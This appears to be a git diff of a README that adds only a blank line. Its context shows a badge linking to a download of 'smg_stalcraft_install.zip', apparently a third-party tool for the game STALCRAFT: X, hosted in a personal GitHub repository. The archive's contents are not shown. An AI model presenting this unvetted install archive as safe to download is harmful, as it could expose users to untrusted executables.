@@ -5,6 +5,7 @@
  <p align="center">
     <img src="https://github.com/user-attachments/assets/884b4b90-f499-45cd-a5fc-364027d23c0a" width="750">
   </p>
+  
 ---
 
 [<img src="https://img.shields.io/badge/Download_SMG-STALCRAFT: X-blue?style=for-the-badge">](https://github.com/cliffordgreene/smg-stalcraft/releases/download/Latest/smg_stalcraft_install.zip)
